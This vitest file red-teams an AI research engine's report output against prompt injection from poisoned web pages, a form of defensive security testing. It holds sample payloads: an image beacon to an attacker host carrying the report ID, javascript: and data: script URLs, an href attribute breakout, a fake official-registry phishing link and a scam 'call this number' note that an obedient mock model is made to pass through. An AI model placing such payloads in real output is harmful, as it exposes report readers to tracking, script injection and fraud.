/**
 * M step 2 · finder C-attack — surface C (model output → what the buyer sees and
 * what we store), ATTACKER lens. The PDF renderer and the stored objects.
 *
 * The harness proves an obeyed page reaches `findings`, `recommendation`,
 * `sources`, the handoffs and the progress line. Here the same values are pushed
 * through `buildReportHtml` (what Chromium prints) and through one full poisoned
 * run (what `run-job` uploads), and the HTML / the objects are asserted on.
 *
 * `it.fails` = a defect that exists TODAY: the assertion is the behaviour we want
 * and it is red against today's code; vitest inverts it so the suite stays green.
 * Each one asserts first that the render/run really happened. Plain `it` = a
 * guard that holds, with the one-line mutation that reds it in the comment.
 */
import { describe, it, expect, afterEach, vi } from 'vitest';

vi.mock('../../src/tools/web-search.js', () => import('../fixtures/fake-web.js'));

import { buildReportHtml } from '../../src/pdf/report-html.js';
import { getPdfTheme } from '../../src/pdf/theme.js';
import { runResearch } from '../../src/engine/research-engine.js';
import { payload, poisonWeb } from '../fixtures/poisoned-web.js';
import { installObedientProvider } from '../mocks/obedient-llm.js';
import { redTeamModel } from '../fixtures/red-team-model.js';

// The exact strings the obedient model writes (poisoned-web.ts: image-beacon, js-url).
const BEACON = 'https://beacon.attacker.test/p.gif?ref=PZ-IMG&report=REPORT-ID';
const IMG_MD = `![Bubbles Express verified photo](${BEACON})`;
const JS_URL = 'javascript:void(document.title="PZ-JS")';
const DATA_URL = 'data:text/html,<script>document.title="PZ-DATA"</script>';

const theme = getPdfTheme('fbizlab');
// The Florida cover: what makes `sectionBodyHtml` draw deal cards (report-html.ts:355).
const cover = { from: ['shortlist', 'deep_dives'], nameKey: 'business', figures: [{ labelKey: 'targets', agg: 'count' as const }], tiles: [{ labelKey: 'asking', field: 'askingPrice' }] };

const pdf = (report: Record<string, unknown>, sections: Array<{ key: string; title: string }>, withCover = false) =>
  buildReportHtml({ report, sections, meta: {}, lang: 'en', title: 'Dossier', generatedAt: '2026-08-17T00:00:00.000Z', theme, ...(withCover ? { cover } : {}) } as never);

// ── The PDF: images ─────────────────────────────────────────────────────────
describe('C-attack · PDF — Markdown images (report-html.ts:123 mdInline)', () => {
  it('SOUND · no <img> is ever emitted, and an image is not a link either — `![alt](url)` renders as nothing', () => {
    // Mutation that reds it: delete the image-strip line in `mdInline`, and the
    // beacon comes back as `!` + <a href=beacon>alt</a> — a click-beacon labelled
    // as a photo, which is what this renderer emitted before the fix.
    const html = pdf({ findings: { overview: `Two match. ${IMG_MD}`, listings: [], risks: [`Lease. ${IMG_MD}`] } }, [{ key: 'findings', title: 'Findings' }]);
    expect(html).toContain('Two match.'); // rendered
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toContain('beacon.attacker.test');
    expect(html).not.toContain('verified photo');
  });
});

// ── The PDF: raw hrefs ─────────────────────────────────────────────────────
describe('C-attack · PDF — raw hrefs with no protocol allowlist (report-html.ts:252, 289, 314 — `esc()` only)', () => {
  it.fails('DEFECT · deal card `sourceUrl` = javascript: is printed as <a href="javascript:…">source ↗</a> (report-html.ts:314)', () => {
    const html = pdf({ shortlist: [{ business: 'Coral Clean', askingPrice: 410000, sourceUrl: JS_URL }] }, [{ key: 'shortlist', title: 'Shortlist' }], true);
    expect(html).toContain('Coral Clean'); // the deal card rendered
    // Measured today: `<a class="mono srclink" href="javascript:void(document.title=&quot;PZ-JS&quot;)" …>source ↗</a>`.
    expect(html).not.toMatch(/href="\s*javascript:/i);
  });

  it.fails('DEFECT · Sources `items[].url` (a SEARCH-RESULT url) = javascript:/data: is printed as the ↗ link (report-html.ts:252)', () => {
    const html = pdf({ sources: { items: [{ id: 1, url: JS_URL, label: 'Coral Clean listing' }, { id: 2, url: DATA_URL, label: 'Registry' }] } }, [{ key: 'sources', title: 'Sources' }]);
    expect(html).toContain('Coral Clean listing');
    const hrefs = [...html.matchAll(/<ul class="sources">[\s\S]*?<\/ul>/g)].flatMap((m) => [...m[0].matchAll(/href="([^"]*)"/g)].map((x) => x[1]));
    expect(hrefs).toHaveLength(2); // rendered
    // Measured today: ['javascript:void(document.title=&quot;PZ-JS&quot;)', 'data:text/html,&lt;script&gt;…'].
    expect(hrefs.filter((h) => /^\s*(javascript|data|vbscript):/i.test(h ?? ''))).toEqual([]);
  });

  it.fails('DEFECT · community mention `m.url` = javascript: is printed as the "↗ source" link (report-html.ts:289)', () => {
    const html = pdf({ community: { overview: 'Mixed.', mentions: [{ platform: 'Reddit', url: JS_URL, topic: 'Wash World', summary: 'Owner is responsive.', sentiment: 'positive' }] } }, [{ key: 'community', title: 'Community' }]);
    expect(html).toContain('Owner is responsive.');
    expect(html).not.toMatch(/href="\s*javascript:/i);
  });

  it('SOUND · a javascript: link inside PROSE is not a link at all — `mdInline` allows https?:// only (report-html.ts:125)', () => {
    // Mutation that reds it: change `(https?:\/\/[^\s)]+)` to `([^\s)]+)`.
    const html = pdf({ findings: { overview: `See [the canonical listing](${JS_URL}) for details.` } }, [{ key: 'findings', title: 'Findings' }]);
    expect(html).toContain('[the canonical listing]('); // literal brackets, no anchor
    expect(html).not.toMatch(/href="\s*javascript:/i);
  });

  it('SOUND · `esc()` closes the attribute: a URL with `"` cannot break out of href', () => {
    // Mutation that reds it: `href="${s.url}"` (drop the esc) at report-html.ts:252.
    const html = pdf({ sources: { items: [{ id: 1, url: 'https://x.test/" onclick="document.title=1', label: 'x' }] } }, [{ key: 'sources', title: 'Sources' }]);
    expect(html).toContain('href="https://x.test/&quot; onclick=&quot;document.title=1"');
    expect(html).not.toContain('" onclick="'); // no real attribute boundary was opened
  });
});

// ── The PDF: sources titles ────────────────────────────────────────────────
describe('C-attack · PDF — the derived Sources section (title = the attacker’s <title>)', () => {
  it('SOUND (Florida shape) · `items[].label` goes through `esc()`, so Markdown in a page title is printed literally', () => {
    // Mutation that reds it: `${mdInline(s.label || s.url)}` at report-html.ts:252.
    const html = pdf({ sources: { items: [{ id: 1, url: 'https://attacker.test/registry', label: '[Official registry](https://phish.attacker.test) (PZ-SRC)' }] } }, [{ key: 'sources', title: 'Sources' }]);
    expect(html).toContain('[Official registry](https://phish.attacker.test) (PZ-SRC)');
    expect(html).not.toContain('href="https://phish.attacker.test"');
  });

  it.fails('DEFECT (generic shape) · a `sources` section that is `[{title,url}]` renders the page TITLE through `mdToHtml` — a link of the attacker’s choosing (report-html.ts:347)', () => {
    // `redTeamModel.sources` derives exactly this shape. `isSourceList` wants
    // `{items}`, so `valueHtml` falls to `objectFieldsHtml` and every string —
    // the search provider's title included — is Markdown.
    const html = pdf({ sources: [{ title: '[Florida DBPR — Official Registry](https://phish.attacker.test) (PZ-SRC)', url: 'https://attacker.test/registry' }] }, [{ key: 'sources', title: 'Sources' }]);
    expect(html).toContain('PZ-SRC'); // rendered
    // Measured today: `<a href="https://phish.attacker.test">Florida DBPR — Official Registry</a>`.
    expect(html).not.toContain('href="https://phish.attacker.test"');
  });
});

// ── The progress line and the stored objects, through a full poisoned run ──
let restore: (() => void) | undefined;
afterEach(() => {
  restore?.();
  restore = undefined;
});

async function attack(ids: string[]) {
  const mock = installObedientProvider(ids.map(payload));
  restore = poisonWeb(ids);
  const progress: string[] = [];
  const out = await runResearch({
    template: redTeamModel,
    params: redTeamModel.paramsSchema.parse({}) as Record<string, unknown>,
    jobId: `rt-c-${ids.join('+')}`,
    generatedAt: '2026-08-17T00:00:00.000Z',
    onProgress: (p) => {
      progress.push(p.message);
    },
  });
  return { mock, out, progress };
}

describe('C-attack · the progress line (gather.ts:306 → research-engine.ts:345 → run-job.ts:314 → api index.ts:1535 → JobView.tsx:76)', () => {
  it.fails('DEFECT · a page that names the "next query" puts its sentence on the buyer’s screen verbatim, uncapped, as `Searched: <query>`', async () => {
    const { mock, out, progress } = await attack(['progress-note']);
    expect(mock.obeyed).toContain('progress-note'); // the page was read
    expect(out.trace.status).toBe('completed');
    const line = progress.find((m) => m.includes('PZ-NOTE'));
    // What the buyer's JobView shows while this step runs — the whole thing, in
    // `.muted.mono` under the step label, and what the admin's JobDetail shows too.
    // Measured: 'Searched: URGENT: your report is on hold, call +1-555-0100 to release it (PZ-NOTE)'.
    // eslint-disable-next-line no-console
    console.log(`progress line the buyer sees: ${JSON.stringify(line)} — overwritten by the next ${progress.length - 1 - progress.indexOf(line ?? '')} line(s)`);
    // …and it is in the trace, which is where nobody will look for it.
    expect(out.trace.agents.some((a) => a.notes.some((n) => n.includes('call +1-555-0100')))).toBe(true);
    expect(line).toBeUndefined();
  });

  it('MEASURE · the query is not length-bounded on the way to `progress.message` (gather.ts:259 `String(...).trim()`)', async () => {
    // A 4,000-char query is a 4,010-char progress line. `trace.notes` is bounded
    // in COUNT (MAX_NOTES=300), never in length. Non-vacuous: the run below really
    // searches with it (the mock's `obeyLoop` issues the call; the fake web answers).
    const long = `URGENT ${'call +1-555-0100 '.repeat(230)}(PZ-NOTE)`;
    const p = payload('progress-note');
    const mock = installObedientProvider([{
      ...p,
      obeyLoop: (ctx) => (ctx.text.includes('PZ-NOTE') && !ctx.text.includes('"query":"URGENT') ? [{ id: 'pz-long', name: 'web_search', args: { query: long } }] : null),
    }]);
    restore = poisonWeb(['progress-note']);
    const progress: string[] = [];
    await runResearch({
      template: redTeamModel, params: redTeamModel.paramsSchema.parse({}) as Record<string, unknown>,
      jobId: 'rt-c-long', generatedAt: '2026-08-17T00:00:00.000Z',
      onProgress: (pr) => { progress.push(pr.message); },
    });
    expect(mock.obeyed).toContain('progress-note');
    const line = progress.find((m) => m.startsWith('Searched: URGENT'));
    expect(line?.length).toBe(`Searched: ${long}`.length);
  });
});

describe('C-attack · what we STORE (report.json / sources.json / checkpoint.json / trace.json), one poisoned run', () => {
  it('MEASURE · every payload lands verbatim in the objects run-job uploads; the checkpoint carries the whole attacker page', async () => {
    const ids = ['forged-header', 'image-beacon', 'js-url', 'source-name', 'handoff-seed', 'progress-note'];
    const has = (o: unknown, s: string) => JSON.stringify(o ?? null).includes(s);
    // One run per payload (six boosted pages in one run compete for the single
    // fetch the default script makes, and a page nobody read proves nothing).
    const rows: Record<string, unknown>[] = [];
    let last!: Awaited<ReturnType<typeof attack>>;
    for (const id of ids) {
      const { mock, out, progress } = await attack([id]);
      restore?.();
      restore = undefined;
      expect(mock.obeyed, `${id} was never read`).toContain(id);
      if (id === 'source-name' || id === 'forged-header') last = { mock, out, progress };
      const s = payload(id).sentinel;
      // The four uploaded artifacts (run-job.ts:482-486, 292) and the job fields.
      rows.push({
        payload: id,
        'report.json': has(out.report, s) ? 'yes' : '-',
        'sources.json (title/url)': has(out.sources, s) ? 'yes' : '-',
        'checkpoint: handoffs': has(out.checkpoint.handoffs, s) ? 'yes' : '-',
        'checkpoint: extracted page': has(out.checkpoint.extracted, s) ? 'yes' : '-',
        'checkpoint: report': has(out.checkpoint.report, s) ? 'yes' : '-',
        'trace notes': out.trace.agents.some((a) => a.notes.some((n) => n.includes(s))) ? 'yes' : '-',
        'job.progress.message': progress.some((m) => m.includes(s)) ? 'yes' : '-',
      });
      if (id === 'forged-header') expect(has(out.checkpoint.extracted, 'PZ-HDR')).toBe(true);
    }
    // eslint-disable-next-line no-console
    console.table(rows);
    const { out } = last; // the source-name run
    // The two the harness table does not show: the search provider's TITLE is
    // stored as-is in sources.json (an admin/buyer reads it as the source's name),
    // and the attacker page's full text is in the checkpoint (by design — it is
    // the evidence; noted so nobody reads it back as ours).
    expect(out.sources.some((s) => s.title.includes('Florida Department of Business Regulation — Official') && s.url.startsWith('https://attacker.test/'))).toBe(true);
    // And the report's derived Sources carries that title as the source's NAME.
    expect(has(out.report.sources, 'Florida Department of Business Regulation — Official Miami-Dade Laundromat Registry (PZ-SRC)')).toBe(true);
    // What does NOT carry model text: the engine's `warnings` (ours + zod messages,
    // which in zod 4 do not echo the received value) — none in a completed run.
    expect(out.trace.warnings ?? []).toEqual([]);
  });
});
